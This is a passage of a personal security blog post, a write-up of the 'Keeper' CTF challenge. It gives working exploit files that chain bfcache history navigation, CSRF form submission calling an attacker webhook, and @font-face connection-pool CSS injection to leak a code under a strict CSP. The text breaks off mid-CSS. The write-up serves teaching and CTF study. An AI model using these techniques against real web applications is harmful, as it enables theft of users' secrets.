<!DOCTYPE html>
<html lang="en">
  <head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <meta
    name="description"
    content="Personal blog about Cybersec &amp; other things."
  />
  
    
      <title>CSS Exfiltration under default-src &#39;self&#39; | Salvatore Abello&#39;s Blog</title>
    
  
  <link rel="stylesheet" href="/css/reset.css"/>
  <link rel="stylesheet" href="/css/font.css"/>
  <link rel="stylesheet" href="/css/smigle.css"/>
  
  <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
  <link rel="manifest" href="/site.webmanifest">
  <link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5">
  <meta name="msapplication-TileColor" content="#da532c">
  <meta name="theme-color" content="#ffffff">
</head>

  <body>
    <div id="root">
      <header>
  <div id="brand">
    <a class="icon-link" href="https://salvatore-abello.github.io/">
      <img
        class="icon"
        src="/images/65adf8e914bdc50b5f5f2e8b91b68cb1.png"
      />
    </a>
    <div class="text">
      <a href="https://salvatore-abello.github.io/"><h1>Salvatore Abello&#39;s Blog</h1></a>
      <h3>Hacking &amp; other stuff</h3>
    </div>
  </div>
  <nav>
    
      
        
        <a href="/"><b>Home</b></a>
      
         | 
        <a href="/whoami/"><b>Whoami</b></a>
      
         | 
        <a href="/achievements/"><b>Achievements</b></a>
      
         | 
        <a href="/posts/"><b>Posts</b></a>
      
         | 
        <a href="/cves/"><b>CVEs</b></a>
      
    
  </nav>
  <hr />
</header>

      <div id="content">
        
  <main>
    <article>
      <h1 class="title">CSS Exfiltration under default-src &#39;self&#39;</h1>
      
      <div class="post-meta">
  <strong>
    <span>Posted on</span>
    <time>2025-02-27 16:14:14</time>
    
    
  </strong>
  <span> • 2235 words</span>
  <span> • 11 minute read</span>
  
  
</div>

      <div class="content"><p>CSS Injections have always fascinated me. A few months ago, I asked myself: <em>&ldquo;is it possible to do CSS Exfiltration if default-src &lsquo;self&rsquo; is specified in the CSP?&rdquo;</em></p>
<p>Well, if you&rsquo;re reading this you already know the answer is yes. Also, I wrote a challenge about this for TRX CTF 2025: <a href="https://github.com/TheRomanXpl0it/TRX-CTF-2025/tree/main/web/keeper">Keeper</a>. This post will serve both as a writeup for the challenge and as an explanation of this new &ldquo;technique&rdquo;.</p>
<!-- raw HTML omitted -->
<h1 id="keeper">Keeper</h1>
<blockquote>
<p>Author: @salvatore-abello</p>
<p>Solves: 3</p>
</blockquote>
<p><img src="/images/image.png" alt="alt text"></p>
<h2 id="overview">Overview</h2>
<p>This is a simple web application to store secrets. The source code of a Python server using <code>Flask</code> is given and there are 4 important routes:</p>
<ul>
<li><code>/set-secret</code>, store a secret given a username and a 6-hexdigit code and then redirect to <code>/</code>. The username and the code will be saved in the session.</li>
<li><code>/</code>, render our secret without escaping it</li>
<li><code>/get-secret</code>, retrieve a secret given its username and code. Only one request every 5 seconds is allowed.</li>
<li><code>/visit</code>, trigger <code>bot.js</code> to visit a given URL. The bot username will be returned to us. This is the source code of <code>bot.js</code>:</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span>...
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">page</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">context</span>.<span style="color:#a6e22e">newPage</span>();
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">random_secret_code</span> <span style="color:#f92672">=</span> Array.<span style="color:#a6e22e">from</span>(<span style="color:#a6e22e">crypto</span>.<span style="color:#a6e22e">randomBytes</span>(<span style="color:#ae81ff">6</span>)).<span style="color:#a6e22e">map</span>(<span style="color:#a6e22e">b</span> =&gt; <span style="color:#e6db74">&#34;ABCDEF0987654321&#34;</span>[<span style="color:#a6e22e">b</span> <span style="color:#f92672">%</span> <span style="color:#ae81ff">16</span>]).<span style="color:#a6e22e">join</span>(<span style="color:#e6db74">&#39;&#39;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">random_username</span> <span style="color:#f92672">=</span> Array.<span style="color:#a6e22e">from</span>(<span style="color:#a6e22e">crypto</span>.<span style="color:#a6e22e">randomBytes</span>(<span style="color:#ae81ff">32</span>)).<span style="color:#a6e22e">map</span>(<span style="color:#a6e22e">b</span> =&gt; <span style="color:#e6db74">&#34;abcdefghijklmnopqrstuvwxyz&#34;</span>[<span style="color:#a6e22e">b</span> <span style="color:#f92672">%</span> <span style="color:#ae81ff">26</span>]).<span style="color:#a6e22e">join</span>(<span style="color:#e6db74">&#39;&#39;</span>);
</span></span><span style="display:flex;"><span>        
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">`</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">random_username</span><span style="color:#e6db74">}</span><span style="color:#e6db74"> will visit </span><span style="color:#e6db74">${</span><span style="color:#a6e22e">SITE</span><span style="color:#e6db74">}</span><span style="color:#e6db74"> first, and then </span><span style="color:#e6db74">${</span><span style="color:#a6e22e">url</span><span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">page</span>.<span style="color:#66d9ef">goto</span>(<span style="color:#e6db74">`</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">SITE</span><span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>, { <span style="color:#a6e22e">waitUntil</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;domcontentloaded&#34;</span>, <span style="color:#a6e22e">timeout</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">5000</span> });
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">sleep</span>(<span style="color:#ae81ff">1500</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">page</span>.<span style="color:#a6e22e">type</span>(<span style="color:#e6db74">&#34;#first-code-digit&#34;</span>, <span style="color:#a6e22e">random_secret_code</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">page</span>.<span style="color:#a6e22e">click</span>(<span style="color:#e6db74">&#34;#next-btn&#34;</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">page</span>.<span style="color:#a6e22e">type</span>(<span style="color:#e6db74">&#34;#username-input&#34;</span>, <span style="color:#a6e22e">random_username</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">page</span>.<span style="color:#a6e22e">type</span>(<span style="color:#e6db74">&#34;#secret-input&#34;</span>, <span style="color:#a6e22e">FLAG</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">page</span>.<span style="color:#a6e22e">click</span>(<span style="color:#e6db74">&#34;#submit-button&#34;</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">sleep</span>(<span style="color:#ae81ff">1500</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">catch</span> (<span style="color:#a6e22e">err</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">error</span>(<span style="color:#a6e22e">err</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">browser</span>) <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">browser</span>.<span style="color:#a6e22e">close</span>();
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">reject</span>(<span style="color:#66d9ef">new</span> Error(<span style="color:#e6db74">&#34;Error: Setup failed, if this happens consistently on remote contact an admin&#34;</span>));
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">resolve</span>(<span style="color:#e6db74">`The user </span><span style="color:#e6db74">${</span><span style="color:#a6e22e">random_username</span><span style="color:#e6db74">}</span><span style="color:#e6db74"> will visit your URL soon`</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">page</span>.<span style="color:#66d9ef">goto</span>(<span style="color:#a6e22e">url</span>, { <span style="color:#a6e22e">waitUntil</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;domcontentloaded&#34;</span>, <span style="color:#a6e22e">timeout</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">5000</span> });
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">sleep</span>(<span style="color:#ae81ff">70_000</span>);
</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">catch</span> (<span style="color:#a6e22e">err</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">error</span>(<span style="color:#a6e22e">err</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>...
</span></span></code></pre></div><p>Every response which won&rsquo;t send HTML is a <code>TextResponse</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">TextResponse</span>(Response):
</span></span><span style="display:flex;"><span>    default_mimetype <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;text/plain&#34;</span>
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> __init__(self, response):
</span></span><span style="display:flex;"><span>        super()<span style="color:#f92672">.</span>__init__(response, content_type<span style="color:#f92672">=</span>self<span style="color:#f92672">.</span>default_mimetype)
</span></span></code></pre></div><p>Note that the Flask session cookie has <code>HttpOnly</code> attribute and also <code>SameSite=Strict</code>. Furthermore, the web application will send the following headers in every request:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#a6e22e">@app.after_request</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">add_security_headers</span>(resp: Response):
</span></span><span style="display:flex;"><span>    resp<span style="color:#f92672">.</span>headers[<span style="color:#e6db74">&#34;Content-Security-Policy&#34;</span>] <span style="color:#f92672">=</span> \
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;default-src &#39;self&#39;;&#34;</span>\
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;base-uri &#39;none&#39;;&#34;</span>\
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;frame-src &#39;none&#39;;&#34;</span>\
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;frame-ancestors &#39;none&#39;;&#34;</span>\
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;style-src &#39;self&#39; &#39;unsafe-inline&#39;;&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    resp<span style="color:#f92672">.</span>headers[<span style="color:#e6db74">&#34;X-Content-Type-Options&#34;</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;nosniff&#34;</span>
</span></span><span style="display:flex;"><span>    resp<span style="color:#f92672">.</span>headers[<span style="color:#e6db74">&#34;Referrer-Policy&#34;</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;no-referrer&#34;</span>
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    resp<span style="color:#f92672">.</span>headers[<span style="color:#e6db74">&#34;Cross-Origin-Opener-Policy&#34;</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;same-origin&#34;</span>
</span></span><span style="display:flex;"><span>    resp<span style="color:#f92672">.</span>headers[<span style="color:#e6db74">&#34;Document-Policy&#34;</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;force-load-at-top&#34;</span>
</span></span><span style="display:flex;"><span>    resp<span style="color:#f92672">.</span>headers[<span style="color:#e6db74">&#34;X-Frame-Options&#34;</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;SAMEORIGIN&#34;</span>
</span></span><span style="display:flex;"><span>    resp<span style="color:#f92672">.</span>headers[<span style="color:#e6db74">&#34;Cache-Control&#34;</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;no-store&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> resp
</span></span></code></pre></div><p>The goal now is pretty obvious: leak the bot code and then get the flag by sending a request to <code>/get-secret</code></p>
<h2 id="solution">Solution</h2>
<p>To achieve our goal, we need to get the bot code and arbitrary HTML on the same page. How do we do this? Enter the <a href="https://developer.mozilla.org/en-US/docs/Glossary/bfcache">bfcache</a>. This cache stores entire pages, including dynamic modifications to the DOM. By letting the user visit a page we control, we can later go back in history using <code>window.history.go(-2)</code> where we will find the bot code.</p>
<p>Result (With <code>d-none</code> removed):</p>
<p><img src="/images/image-1.png" alt="alt text"></p>
<p>When <code>window.history.go(-2)</code> is executed, the page becomes isolated from other pages due to the <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Cross-Origin-Opener-Policy">COOP</a> header. The next step is to do CSRF to set an arbitrary secret. This can be done by opening a separate window where a form targeting <code>http://localhost:1337/set-secret</code> will be submitted</p>
<p><strong>exploit.html</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>    &lt;<span style="color:#f92672">script</span>&gt;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">popup</span>(<span style="color:#a6e22e">url</span>){
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">w</span> <span style="color:#f92672">=</span> window.<span style="color:#a6e22e">open</span>(<span style="color:#a6e22e">url</span>, <span style="color:#e6db74">&#34;s1&#34;</span>, <span style="color:#e6db74">&#34;width= 640, height= 480, left=0, top=0, resizable=yes, toolbar=no, location=no, directories=no, status=no, menubar=no, scrollbars=yes, resizable=no, copyhistory=no&#34;</span>)
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">w</span>.<span style="color:#a6e22e">blur</span>();
</span></span><span style="display:flex;"><span>            window.<span style="color:#a6e22e">focus</span>();
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">w</span>;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">sleep</span> <span style="color:#f92672">=</span> (<span style="color:#a6e22e">ms</span>) =&gt; {
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">new</span> Promise(<span style="color:#a6e22e">resolve</span> =&gt; {
</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">setTimeout</span>(<span style="color:#a6e22e">resolve</span>, <span style="color:#a6e22e">ms</span>);
</span></span><span style="display:flex;"><span>            });
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">async</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">main</span>(){
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">fetch</span>(<span style="color:#e6db74">&#34;{{ webhook }}?STARTING&#34;</span>, {<span style="color:#a6e22e">mode</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;no-cors&#34;</span>})
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">sleep</span>(<span style="color:#ae81ff">2000</span>);
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">w1</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">popup</span>(<span style="color:#e6db74">`/csrf`</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">sleep</span>(<span style="color:#ae81ff">1000</span>); <span style="color:#75715e">// wait for form submission
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>            
</span></span><span style="display:flex;"><span>            window.<span style="color:#a6e22e">history</span>.<span style="color:#a6e22e">go</span>(<span style="color:#f92672">-</span><span style="color:#ae81ff">2</span>);
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        document.<span style="color:#a6e22e">addEventListener</span>(<span style="color:#e6db74">&#34;DOMContentLoaded&#34;</span>, <span style="color:#a6e22e">main</span>);
</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">script</span>&gt;
</span></span></code></pre></div><p><strong>csrf.html</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>...
</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">body</span>&gt;
</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;container text-center&#34;</span>&gt;
</span></span><span style="display:flex;"><span>        &lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;row justify-content-center mb-3&#34;</span>&gt;
</span></span><span style="display:flex;"><span>            &lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;col-10 col-md-6&#34;</span>&gt;
</span></span><span style="display:flex;"><span>                &lt;<span style="color:#f92672">h5</span>&gt;Input your secret here:&lt;/<span style="color:#f92672">h5</span>&gt;
</span></span><span style="display:flex;"><span>                
</span></span><span style="display:flex;"><span>                &lt;<span style="color:#f92672">form</span> <span style="color:#a6e22e">action</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;{{ chall_url }}/set-secret&#34;</span> <span style="color:#a6e22e">method</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;POST&#34;</span>&gt;
</span></span><span style="display:flex;"><span>                    &lt;<span style="color:#f92672">input</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;input&#34;</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;form-control&#34;</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;code&#34;</span> <span style="color:#a6e22e">rows</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;2&#34;</span> <span style="color:#a6e22e">value</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;{{ random_password }}&#34;</span>&gt;&lt;/<span style="color:#f92672">input</span>&gt;
</span></span><span style="display:flex;"><span>                    &lt;<span style="color:#f92672">input</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;input&#34;</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;form-control&#34;</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;username&#34;</span> <span style="color:#a6e22e">rows</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;2&#34;</span> <span style="color:#a6e22e">value</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;{{ random_username }}&#34;</span>&gt;&lt;/<span style="color:#f92672">input</span>&gt;
</span></span><span style="display:flex;"><span>                    &lt;<span style="color:#f92672">input</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;input&#34;</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;form-control&#34;</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;secret&#34;</span> <span style="color:#a6e22e">rows</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;2&#34;</span> <span style="color:#a6e22e">value</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;{{ css_payload }}&#34;</span>&gt;&lt;/<span style="color:#f92672">input</span>&gt;
</span></span><span style="display:flex;"><span>                    &lt;<span style="color:#f92672">button</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;submit&#34;</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;btn btn-primary mt-3&#34;</span>&gt;Submit&lt;/<span style="color:#f92672">button</span>&gt;
</span></span><span style="display:flex;"><span>                &lt;/<span style="color:#f92672">form</span>&gt;
</span></span><span style="display:flex;"><span>            &lt;/<span style="color:#f92672">div</span>&gt;
</span></span><span style="display:flex;"><span>        &lt;/<span style="color:#f92672">div</span>&gt;
</span></span><span style="display:flex;"><span>        &lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;row justify-content-center&#34;</span>&gt;
</span></span><span style="display:flex;"><span>            &lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;col-10 col-md-6&#34;</span>&gt;
</span></span><span style="display:flex;"><span>                &lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;secret-container border p-3&#34;</span>&gt;
</span></span><span style="display:flex;"><span>                    &lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;hover-text&#34;</span>&gt;Hover me to show the secret&lt;/<span style="color:#f92672">div</span>&gt;
</span></span><span style="display:flex;"><span>                    &lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;secret-div&#34;</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;secret&#34;</span>&gt;&lt;/<span style="color:#f92672">div</span>&gt;
</span></span><span style="display:flex;"><span>                &lt;/<span style="color:#f92672">div</span>&gt;
</span></span><span style="display:flex;"><span>            &lt;/<span style="color:#f92672">div</span>&gt;
</span></span><span style="display:flex;"><span>        &lt;/<span style="color:#f92672">div</span>&gt;
</span></span><span style="display:flex;"><span>    &lt;/<span style="color:#f92672">div</span>&gt;
</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">script</span>&gt; 
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">sleep</span> <span style="color:#f92672">=</span> (<span style="color:#a6e22e">ms</span>) =&gt; {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">new</span> Promise(<span style="color:#a6e22e">resolve</span> =&gt; {
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">setTimeout</span>(<span style="color:#a6e22e">resolve</span>, <span style="color:#a6e22e">ms</span>);
</span></span><span style="display:flex;"><span>        });
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">async</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">csrf_submit</span>(){
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">sleep</span>(<span style="color:#ae81ff">50</span>);
</span></span><span style="display:flex;"><span>        document.<span style="color:#a6e22e">forms</span>[<span style="color:#ae81ff">0</span>].<span style="color:#a6e22e">submit</span>();
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">fetch</span>(<span style="color:#e6db74">&#34;{{ webhook }}?DOING_CSRF&#34;</span>, {<span style="color:#a6e22e">mode</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;no-cors&#34;</span>})
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">csrf_submit</span>();    
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">script</span>&gt;
</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">body</span>&gt;
</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">html</span>&gt;
</span></span></code></pre></div><p><strong>Result</strong></p>
<p><img src="/images/image-2.png" alt="alt text"></p>
<p>Nice. Since no script can be executed, the only thing that can be done is CSS Injection. Since the single code digits are in separate <code>&lt;input&gt;</code> tags, a simple Text Node Exfiltration is enough to leak the code. This can be done via <a href="https://developer.mozilla.org/en-US/docs/Web/CSS/@font-face">font-face at rule</a> and unicode-range, <a href="https://book.hacktricks.wiki/en/pentesting-web/xs-search/css-injection/index.html#font-face--unicode-range">as described here</a>. There&rsquo;s only one problem: this technique won&rsquo;t work since <code>default-src: self</code> is specified in the CSP, so no external requests can be sent.</p>
<p>So, how can we leak the code without sending external requests?
This is where the Connection Pool comes into play.</p>
<h3 id="swimming-in-the-connection-pool-">Swimming in the Connection Pool 🏊</h3>
<p>Abusing the connection pool is not a new concept, and there have been numerous challenges built around this technique. The core idea is that browsers use sockets to communicate with servers. As the operating system and the hardware it runs on have limited resources <!-- raw HTML omitted -->browsers have to impose a limit<sup id="fnref:1"><a href="#fn:1" class="footnote-ref" role="doc-noteref">1</a></sup><!-- raw HTML omitted -->. If all sockets are occupied, no other requests can be made until one is freed. This can be exploited to measure the loading time of a request from another page or to detect if a resource has been requested.<br>
However, the following technique doesn&rsquo;t require measuring the loading time or detecting resource requests. Instead, it involves counting how many requests have been made. For this challenge, I came up with a method using CSS injection to map each character in the charset (<code>abcdef0987654321</code>)to a number of requests, ranging from 1 to 16 (actually 3 to 18). These requests will be sent using the <code>font-face</code> at-rule. Here&rsquo;s an example:&quot;</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-css" data-lang="css"><span style="display:flex;"><span>@<span style="color:#66d9ef">font-face</span>{
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">font-family</span>:<span style="color:#a6e22e">has_A</span><span style="color:#f92672">;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">src</span><span style="color:#f92672">:</span> <span style="color:#f92672">url</span><span style="color:#f92672">(</span><span style="color:#f92672">http</span><span style="color:#f92672">://</span><span style="color:#f92672">localhost</span>:<span style="color:#a6e22e">1337</span><span style="color:#f92672">/</span><span style="color:#f92672">1118104637</span>.<span style="color:#a6e22e">something</span><span style="color:#f92672">?</span><span style="color:#f92672">random</span><span style="color:#f92672">=</span><span style="color:#f92672">3714835915</span><span style="color:#f92672">),</span><span style="color:#f92672">url</span><span style="color:#f92672">(</span><span style="color:#f92672">http</span><span style="color:#f92672">://</span><span style="color:#f92672">localhost</span>:<span style="color:#a6e22e">1337</span><span style="color:#f92672">/</span><span style="color:#f92672">2235380074</span>.<span style="color:#a6e22e">something</span><span style="color:#f92672">?</span><span style="color:#f92672">random</span><span style="color:#f92672">=</span><span style="color:#f92672">670921881</span><span style="color:#f92672">),</span><span style="color:#f92672">url</span><span style="color:#f92672">(</span><span style="color:#f92672">http</span><span style="color:#f92672">://</span><span style="color:#f92672">localhost</span>:<span style="color:#a6e22e">1337</span><span style="color:#f92672">/</span><span style="color:#f92672">3179595971</span>.<span style="color:#a6e22e">something</span><span style="color:#f92672">?</span><span style="color:#f92672">random</span><span style="color:#f92672">=</span><span style="color:#f92672">1661173205</span><span style="color:#f92672">);</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">unicode-range</span>:<span style="color:#a6e22e">U</span><span style="color:#f92672">+</span><span style="color:#f92672">0041</span><span style="color:#f92672">;</span>
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>@<span style="color:#66d9ef">font-face</span>{
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">font-family</span>:<span style="color:#a6e22e">has_B</span><span style="color:#f92672">;</span>
